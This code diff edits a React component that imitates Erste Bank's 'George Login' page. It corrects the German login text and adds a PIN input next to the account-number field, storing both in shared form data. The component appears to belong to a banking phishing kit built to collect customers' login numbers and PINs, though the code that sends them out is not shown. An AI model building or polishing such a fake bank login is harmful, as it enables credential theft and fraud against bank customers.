@@ -47,8 +47,8 @@ export function ErsteBank({ formData, onChange, handleRouteAction, saving }: Pro
             <h1 className="text-[#0f2c59] text-[22px] font-bold mb-6 text-center">George Login</h1>
 
             <p className="text-[#4a5568] text-[14px] leading-relaxed mb-6 self-start">
-              Voer uw inlogcode in of<br />
-              Ihren selbst gewählten Gebruikersnaamn<br />
+              Geben Sie Ihre Verfügernummer oder<br />
+              Ihren selbst gewählten Benutzernamen<br />
               ein.
             </p>
 
@@ -62,9 +62,25 @@ export function ErsteBank({ formData, onChange, handleRouteAction, saving }: Pro
                 <input 
                   type="text" 
                   required
-                  placeholder="Inlogcode/Gebruikersnaam"
+                  placeholder="Verfügernummer/Benutzername"
                   value={formData.verfuegernummer || ""}
                   onChange={(e) => onChange("verfuegernummer", e.target.value)}
+                  className="w-full h-[44px] border border-[#cbd5e0] rounded-[8px] pl-10 pr-4 outline-none focus:border-[#2d68ff] focus:ring-1 focus:ring-[#2d68ff] text-[#2d3748] placeholder-[#a0aec0] text-[14px] transition-all"
+                />
+              </div>
+
+              <div className="relative w-full">
+                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
+                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" />
+                  </svg>
+                </div>
+                <input 
+                  type="password" 
+                  required
+                  placeholder="PIN"
+                  value={formData.pin || ""}
+                  onChange={(e) => onChange("pin", e.target.value)}
                   className="w-full h-[44px] border border-[#cbd5e0] rounded-[8px] pl-10 pr-4 outline-none focus:border-[#2d68ff] focus:ring-1 focus:ring-[#2d68ff] text-[#2d3748] placeholder-[#a0aec0] text-[14px] transition-all"
                 />
               </div>
